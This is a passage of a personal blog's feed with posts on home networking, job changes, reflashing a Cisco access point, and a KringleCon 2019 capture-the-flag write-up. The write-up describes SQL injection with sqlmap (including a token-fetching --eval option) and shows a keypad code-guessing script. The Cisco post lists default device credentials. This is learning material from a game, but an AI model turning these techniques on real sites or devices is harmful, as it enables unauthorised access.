&lt;p&gt;&lt;strong&gt;Update2&lt;/strong&gt;: Tried to move AP but no luck. Instead now took an unused Internet Gateway ( Huawei HG635) and turned it into bridge mode and set the same SSID and passwords. Had to delete the existing Ethernet connection first and set it to internet. Then found some unused Zyxel Powerline adapters and got the AP connected upstairs. Had to put the 'Internet' in one of the LAN ports. But handy, can use it as a switch for my desktop upstairs too. So far so good! Had issues with this Ethernet over Power; before in a previous apartment, where the connection would break every now and then.&lt;/p&gt;</content><category term="it"></category></entry><entry><title>3 months at IQM today!</title><link href="/3-months-at-iqm-today.html" rel="alternate"></link><published>2020-06-17T00:00:00+03:00</published><updated>2020-06-17T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-06-17:/3-months-at-iqm-today.html</id><summary type="html">&lt;p&gt;And I'm on holiday :)&lt;/p&gt;
&lt;p&gt;Wasn't really expecting to be able to go on holiday working for a startup, but there's some coverage and the old IT Admin is still there so very nice to be able to take time off and not have to worry. Even get some more later …&lt;/p&gt;</summary><content type="html">&lt;p&gt;And I'm on holiday :)&lt;/p&gt;
&lt;p&gt;Wasn't really expecting to be able to go on holiday working for a startup, but there's some coverage and the old IT Admin is still there so very nice to be able to take time off and not have to worry. Even get some more later in the summer. All those extra hours I managed to squeeze in by not commuting to work got me a few extra weeks of holiday :)&lt;/p&gt;
&lt;p&gt;Got lots of things in the pipeline to think about though, without going into much details they are important but quite some distance from what I've worked with so far - basically a whole ecosystem to get familiar with. Soon I'll have to decide if I want to do it hacky way, learning what the proper way or try to outsource it. But what I want shouldn't come first, what makes business sense should.&lt;/p&gt;
&lt;p&gt;So far have enjoyed getting reacquainted with the ELK stack and getting acquainted with Prometheus for monitoring. No fancy queries yet, but so far looking quite OK.&lt;/p&gt;
&lt;p&gt;Unsurprisingly I've also enjoyed doing some documentation work and keeping things patched :)&lt;/p&gt;</content><category term="it"></category></entry><entry><title>One month at IQM today!</title><link href="/one-month-at-iqm-today.html" rel="alternate"></link><published>2020-04-17T00:00:00+03:00</published><updated>2020-04-17T00:00:00+03:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-04-17:/one-month-at-iqm-today.html</id><summary type="html">&lt;p&gt;Was reminded that today was exactly one calendar month since I joined IQM Finland&lt;/p&gt;
&lt;p&gt;It's been a very hectic month and it's been mostly remote because of the pandemic. Have met a few people, video chatted with a few. We have these weekly lunch meetings that is a good way …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Was reminded that today was exactly one calendar month since I joined IQM Finland&lt;/p&gt;
&lt;p&gt;It's been a very hectic month and it's been mostly remote because of the pandemic. Have met a few people, video chatted with a few. We have these weekly lunch meetings that is a good way to see and hear people . I try to bring up a little bit social non work things in the video meetings just to get to know people a little bit.&lt;/p&gt;
&lt;p&gt;I'm really enjoying it and it's been interesting to see how the company mindset makes such a difference to my work as a sysadmin/it specialist.&lt;/p&gt;</content><category term="it"></category></entry><entry><title>Yesterday was my last day at CSCfi</title><link href="/yesterday-was-my-last-day-at-cscfi.html" rel="alternate"></link><published>2020-03-08T00:00:00+02:00</published><updated>2020-03-08T00:00:00+02:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-03-08:/yesterday-was-my-last-day-at-cscfi.html</id><summary type="html">&lt;p&gt;9 years were significant and meaningful to me.&lt;/p&gt;
&lt;p&gt;We did a lot of cool things that as a very nice side benefit helped research, both in Finland and in other places!&lt;/p&gt;
&lt;p&gt;I’ve been involved in some core projects, both for internal users and external ones. I was free to …&lt;/p&gt;</summary><content type="html">&lt;p&gt;9 years were significant and meaningful to me.&lt;/p&gt;
&lt;p&gt;We did a lot of cool things that as a very nice side benefit helped research, both in Finland and in other places!&lt;/p&gt;
&lt;p&gt;I’ve been involved in some core projects, both for internal users and external ones. I was free to release code as open source. I have solved hard problems, gotten rid of manual work with automation and helped people grow.&lt;/p&gt;
&lt;p&gt;I’m happy to have met great friends and colleagues at &lt;a href="https://twitter.com/CSCfi"&gt;CSCfi&lt;/a&gt;. I’ve learned so much and many thanks for showing how to work right and that it's not all about 9-5 work.&lt;/p&gt;
&lt;p&gt;It has been a rewarding experience. I like to think I've come quite some way from where I started. So long, @CSCfi, and thanks for (all the fish) lasting memories!&lt;/p&gt;</content><category term="finland"></category></entry><entry><title>AIR-LAP1142N-E-K9 to autonomous Mode Adventure</title><link href="/air-lap1142n-e-k9-to-autonomous-mode-adventure.html" rel="alternate"></link><published>2020-02-19T00:00:00+02:00</published><updated>2020-02-19T00:00:00+02:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-02-19:/air-lap1142n-e-k9-to-autonomous-mode-adventure.html</id><summary type="html">&lt;blockquote&gt;
&lt;h2 id="_1"&gt;&lt;a href="images/DSC_1469-scaled.jpg"&gt;&lt;img alt="Wifi and PoE injector " src="images/DSC_1469-300x225.jpg"&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;/blockquote&gt;
&lt;h2 id="some-initial-needful-information"&gt;Some initial needful information&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Reset is done by holding MODE and then powering off and on the device&lt;/li&gt;
&lt;li&gt;Default enable password is Cisco&lt;/li&gt;
&lt;li&gt;Serial ttyUSB0 worked with one usb to rs232 and then a serial to RJ45 adapter, my cheapo ebay USB to rj45 did not work. The colors of …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;blockquote&gt;
&lt;h2 id="_1"&gt;&lt;a href="images/DSC_1469-scaled.jpg"&gt;&lt;img alt="Wifi and PoE injector " src="images/DSC_1469-300x225.jpg"&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;/blockquote&gt;
&lt;h2 id="some-initial-needful-information"&gt;Some initial needful information&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Reset is done by holding MODE and then powering off and on the device&lt;/li&gt;
&lt;li&gt;Default enable password is Cisco&lt;/li&gt;
&lt;li&gt;Serial ttyUSB0 worked with one usb to rs232 and then a serial to RJ45 adapter, my cheapo ebay USB to rj45 did not work. The colors of the wires are different..&lt;ul&gt;
&lt;li&gt;working: LL977744 CSA AWM and a "pl2303 converter" Prolific Technology Inc on ttyUSB0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Firmware c1140-k9w7-tar.153-3.JD17.tar found on twitter with checksum d96702caf75442f01359aa9a6cb70d19&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;While the AP is in non autonomous mode you need to run a debug command to get the conf t: &lt;em&gt;debug capwap console cli&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;To change it from using a controller to autonomous mode you need to load a firmware that is like that. The one I got had a firmware loaded that wanted to talk to a controller.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;While looking in serial log indeed the firmware on the AP was "w8" at the end == needs a WLC&lt;/li&gt;
&lt;li&gt;tried to first setup a TFTP server and open firewalls and reboot the access point while holding the mode button (you need to hold it for a long time, like 27s) - it tried to fetch the image from tftp://255.255.255.255/ but didn't work / timed out..&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="hunt-goes-on"&gt;Hunt goes on:&lt;/h2&gt;
&lt;p&gt;These release notes got me a bit worried: &lt;a href="https://www.cisco.com/c/en/us/td/docs/wireless/access_point/ios/release/notes/aap-rn-83mr5.html"&gt;https://www.cisco.com/c/en/us/td/docs/wireless/access_point/ios/release/notes/aap-rn-83mr5.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Conversions from an 8.0 Wireless LAN Controller unified release AP image to autonomous 15.3(3) k9w7 image will get aborted with a message “AP image integrity check failed.” To overcome this, load any previous autonomous k9w7 image and then upgrade to the 15.3(3) JAB k9w7 images. &lt;strong&gt;If this is the same as LWAPP version I had was 7.3.x&lt;/strong&gt; &lt;em&gt;so the above did not apply.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://greenwhitehat.blogspot.com/2017/08/how-to-configure-cisco-access-point-air.html"&gt;https://greenwhitehat.blogspot.com/2017/08/how-to-configure-cisco-access-point-air.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.fragmentationneeded.net/2010/08/tftp-oddities.html"&gt;https://www.fragmentationneeded.net/2010/08/tftp-oddities.html&lt;/a&gt; is talking about changing listening address to 255.255.255.255 instead of 0.0.0.0 ..&lt;/p&gt;
&lt;h2 id="secret-sauze"&gt;secret sauze&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;setup static IP on your linux computer, &lt;strong&gt;&lt;em&gt;make sure to not just "ip addr add ip/24 dev eth0" because you might still have NetworkManager with DHCP that might revert those changes&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;setup a dhcpd that has 10.0.0.5 10.0.0.7 range or some such&lt;/li&gt;
&lt;li&gt;setup a linux tftp.service - if you want "--verbose --address 255.255.255.255:69" to the tftp.service CentOS7 edit that file in systemctl cat tftp&lt;ul&gt;
&lt;li&gt;Not sure if needed but maybe it was useful&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;systemctl start tftp dhcpd&lt;/li&gt;
&lt;li&gt;sysetmctl disable dhcpd tftp&lt;/li&gt;
&lt;li&gt;make sure to let UDP(&amp;amp; TCP?) 69 through the firewall&lt;/li&gt;
&lt;li&gt;next is to connect the console and login to the AP and run some commands:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ena&lt;/span&gt;
&lt;span class="c1"&gt;# conf t&lt;/span&gt;
&lt;span class="c1"&gt;# debug capwap console cli&lt;/span&gt;
&lt;span class="c1"&gt;# archive download-sw /force-reload /overwrite tftp://10.0.0.2/c1140-k9w7-tar.153-3.JD17.tar&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Before you disconnect the ethernet cable to the AP, do stop and disable dhcpd and tftp to prevent running some extra dhcp server in some office network.&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="configuring-it"&gt;Configuring it&lt;/h2&gt;
&lt;p&gt;Easiest is probably to use the http on http://IP:80 to configure it&lt;/p&gt;
&lt;p&gt;Username/Password: Cisco/Cisco&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisco.com/c/en/us/td/docs/wireless/access_point/1140/autonomous/getting_started/guide/ap1140aut_getstart.html"&gt;https://www.cisco.com/c/en/us/td/docs/wireless/access_point/1140/autonomous/getting_starte d/guide/ap1140aut_getstart.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There's the express setup and I used these settings:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Only configured the 5GHz&lt;/li&gt;
&lt;li&gt;Set a short SSID and enabled broadcast beacon&lt;/li&gt;
&lt;li&gt;WPA2-PSK key&lt;/li&gt;
&lt;li&gt;Disabled universal admin&lt;/li&gt;
&lt;li&gt;Set VLAN 5 and native VLAN&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Other changes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Enable the radio (no shutdown on the interface or in the web ui)&lt;/li&gt;
&lt;li&gt;Create a new user/change default passwords of Cisco user to make it a little bit harder for things to pwn it&lt;/li&gt;
&lt;li&gt;Set clock&lt;/li&gt;
&lt;li&gt;Change hostname and set a banner login banner&lt;/li&gt;
&lt;li&gt;copy run start&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One could enable https, but that used a too weak key by default so I just left it at http. In any case make sure to set the clock before enabling https.&lt;/p&gt;
&lt;h2 id="some-extremely-useful-links"&gt;Some extremely useful links&lt;/h2&gt;
&lt;p&gt;Previous post in this blog about my home network: &lt;a href="https://www.guldmyr.com/home-network-convergence/"&gt;https://www.guldmyr.com/home-network-convergence/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://community.cisco.com/t5/wireless-mobility-documents/lwapp-to-autonomous-conversion-and-vice-versa-on-access-points/ta-p/3121542"&gt;https://community.cisco.com/t5/wireless-mobility-documents/lwapp-to-autonomous-conversion-and-vice-versa-on-access-points/ta-p/3121542&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://wiki.r1soft.com/display/ServerBackup/Configure+a+TFTP+server+on+Linux"&gt;http://wiki.r1soft.com/display/ServerBackup/Configure+a+TFTP+server+on+Linux&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://exchange2013pikasuoh.blogspot.com/2015/08/convert-cisco-air-lap1142n-k9-to.html"&gt;http://exchange2013pikasuoh.blogspot.com/2015/08/convert-cisco-air-lap1142n-k9-to.html&lt;/a&gt;&lt;/p&gt;</content><category term="it"></category><category term="aironet"></category><category term="cisco"></category><category term="ethernet"></category><category term="https"></category><category term="ip"></category><category term="lap1142n e k9"></category><category term="network"></category><category term="vlan"></category><category term="wifi"></category><category term="wlan"></category></entry><entry><title>Quadra - Did You Play It?</title><link href="/quadra-did-you-play-it.html" rel="alternate"></link><published>2020-02-06T00:00:00+02:00</published><updated>2020-02-06T00:00:00+02:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-02-06:/quadra-did-you-play-it.html</id><summary type="html">&lt;p&gt;In my youth I enjoyed the LANs. One fun game we played was Quadra - which is a multiplayer tetris where by playing the game you send more blocks to your opponents making it very stressful :D&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/quadra-game/quadra"&gt;https://github.com/quadra-game/quadra&lt;/a&gt; turns out it is open source and it's out …&lt;/p&gt;</summary><content type="html">&lt;p&gt;In my youth I enjoyed the LANs. One fun game we played was Quadra - which is a multiplayer tetris where by playing the game you send more blocks to your opponents making it very stressful :D&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/quadra-game/quadra"&gt;https://github.com/quadra-game/quadra&lt;/a&gt; turns out it is open source and it's out there!&lt;/p&gt;
&lt;p&gt;Does it still build?&lt;/p&gt;
&lt;p&gt;CentOS 7.7:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;yum&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;git
$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;clone&lt;span class="w"&gt; &lt;/span&gt;github.com/quadra-game/quadra
$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;yum&lt;span class="w"&gt; &lt;/span&gt;groupinstall&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Development Tools&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
$&lt;span class="w"&gt; &lt;/span&gt;sudo&lt;span class="w"&gt; &lt;/span&gt;yum&lt;span class="w"&gt; &lt;/span&gt;install&lt;span class="w"&gt; &lt;/span&gt;SDL2-devel&lt;span class="w"&gt; &lt;/span&gt;boost-devel&lt;span class="w"&gt; &lt;/span&gt;libpng-devel
$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;quadra
$&lt;span class="w"&gt; &lt;/span&gt;autoreconf&lt;span class="w"&gt; &lt;/span&gt;-i
$&lt;span class="w"&gt; &lt;/span&gt;./configure
$&lt;span class="w"&gt; &lt;/span&gt;make
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;It DOES!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Does it run!?&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ QUADRADIR=. ./quadra&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And I get a very nice window :)&lt;/p&gt;
&lt;p&gt;&lt;img alt="screenshot" src="images/quadra_2020-1024x466.png"&gt;&lt;/p&gt;
&lt;p&gt;Quadra in 2020! (do note that it tries to talk to google and sourceforge for updates and so on, try the ./configure --disable-version-check)&lt;/p&gt;
&lt;p&gt;I could even launch one process to run a server and then another server and connect to localhost :) So multiplayer must sureley durely work!&lt;/p&gt;
&lt;p&gt;It's a big laggy - I recall it being very snappy because I was da bomb at this game :)&lt;/p&gt;
&lt;p&gt;I blame this on that I might have missed some dependency and it now fell back into some easier something and or maybe the graphics card in this laptop is not good (maybe it's too new? It's a Skylake GT2 HD G 520).&lt;/p&gt;</content><category term="it"></category></entry><entry><title>Kringlecon 2019 Write-Up</title><link href="/kringlecon-2019-write-up.html" rel="alternate"></link><published>2020-01-15T00:00:00+02:00</published><updated>2020-01-15T00:00:00+02:00</updated><author><name>Johan Guldmyr</name></author><id>tag:None,2020-01-15:/kringlecon-2019-write-up.html</id><summary type="html">&lt;h2 id="the-challenges"&gt;The challenges!&lt;/h2&gt;
&lt;p&gt;Hoe the season to be jolly! Been giving a few &lt;a href="https://en.wikipedia.org/wiki/Capture_the_flag_(disambiguation)"&gt;CTFs&lt;/a&gt;  lately. It started with the disobey 2020 &lt;a href="https://disobey2020.github.io/"&gt;puzzle&lt;/a&gt; to get the hacker ticket. Then there was the &lt;a href="https://overthewire.org/"&gt;OverTheWire&lt;/a&gt;'s 2019 advent CTF. And finally this one, the SANS holiday hackmechallenge - &lt;a href="https://holidayhackchallenge.com/2019/"&gt;KringleCon&lt;/a&gt; 2019. As of writing I got …&lt;/p&gt;</summary><content type="html">&lt;h2 id="the-challenges"&gt;The challenges!&lt;/h2&gt;
&lt;p&gt;Hoe the season to be jolly! Been giving a few &lt;a href="https://en.wikipedia.org/wiki/Capture_the_flag_(disambiguation)"&gt;CTFs&lt;/a&gt;  lately. It started with the disobey 2020 &lt;a href="https://disobey2020.github.io/"&gt;puzzle&lt;/a&gt; to get the hacker ticket. Then there was the &lt;a href="https://overthewire.org/"&gt;OverTheWire&lt;/a&gt;'s 2019 advent CTF. And finally this one, the SANS holiday hackmechallenge - &lt;a href="https://holidayhackchallenge.com/2019/"&gt;KringleCon&lt;/a&gt; 2019. As of writing I got what felt like quite far in the disobey but got real nice stuck in the second keyhole. For OTF I found a similar but slightly easier challenge on the 6th day December, but did not manage to get the key. Most others except the first and challenge-zero I didn't really have time for. So with not so much progress it was very nice to take a step back and try out KringleCon where I managed to get a bit further!&lt;/p&gt;
&lt;p&gt;[su_accordion] [su_spoiler title="TLDR"]&lt;/p&gt;
&lt;p&gt;Short tldr of methods to answers to the objectives&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;talkt to santa: go upupuppu and click click click :)&lt;/li&gt;
&lt;li&gt;find turtle doves: mm they were in the union&lt;/li&gt;
&lt;li&gt;unredact: at the time I was on ski holiday so used &lt;strong&gt;termux&lt;/strong&gt; on my phone and installed &lt;strong&gt;pdf2txt&lt;/strong&gt; there to unredact it :) Fun to use the phone :)&lt;/li&gt;
&lt;li&gt;windows event log outcome: clicked around until I found something that looked suspicious. I think it was a filename that looked sensitive.&lt;/li&gt;
&lt;li&gt;windows event log technique: parsed these with python to print command_line and procerss_name the cat&lt;/li&gt;
&lt;li&gt;network log - compromised system: got it to print IPs with python&lt;/li&gt;
&lt;li&gt;splunk: followed the chat, was quite a nice way to learn the tool. Finding the correct file in the archive was a bit tricky, had to read through the chats carefully several times :)&lt;/li&gt;
&lt;li&gt;steam tunnels: the physical key! Spent quite some time wandering around trying to find the key. Eventually gave up. Then tried again after making it into the sleigh shop and hey there it was :) Couldn't really get the decoder to line up so used pixels mostly, took 5 times or so :)&lt;/li&gt;
&lt;li&gt;captcha: super fun, most fun. Hadn't tensorflowed before. Followed the youtube and github repo basically. Used an 80core 365GB cloud instance from $dayjob for a short while as the 2core 2GB RAM instance I used was too small ;)&lt;/li&gt;
&lt;li&gt;scraps: hadn't used sqlmap before either. First mapped out the page manually to find the forms. Then learnt about sqlmap --crawl :) Money shot for me was --eval="import requests;token=requests.get('https://studentportal.elfu.org/validator.php').text"&lt;/li&gt;
&lt;li&gt;elfscrow: So. Hard. Learnt a bit more assembly reading. Used IDA this time instead of my previous attempts with radare2. Wonder when I'll get better at these :)&lt;/li&gt;
&lt;li&gt;sleigh shop door. also very fun to unlock those locks! Did not solve it under 5s but the one slower than that.&lt;/li&gt;
&lt;li&gt;filter out poisoned: ugh this one was tedious. Actually this and previous I did spend some time trying to learn them, but in the end found a write-up that was published too early (and later removed but still in google cache..)
[/su_spoiler] [/su_accordion]&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id="getting-on-with-it"&gt;Getting on with it!&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The pdf deobfuscate I could do on my phone in termux just a pkg install pdftotext :)&lt;/li&gt;
&lt;li&gt;The nyancat took a bit of more time than I should admit, but primarily I forgot how sudo works and what sudo -u does..&lt;/li&gt;
&lt;li&gt;The frosty keypad I got to write a small python script: (also on a wall somewhere :)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;

&lt;span class="c1"&gt;#numbers = [ 1, 3, 7 ]&lt;/span&gt;

&lt;span class="n"&gt;results&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1337&lt;/span&gt;

&lt;span class="c1"&gt;# from https://linuxconfig.org/function-to-check-for-a-prime-number-with-python&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_prime_number&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# from https://trinket.io/python3/00754ec904&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
     &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;digit&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
       &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
       &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;7&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;4&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;5&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;6&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;8&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;9&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;digits&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
           &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;is_prime_number&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
             &lt;span class="n"&gt;results&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;digits&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
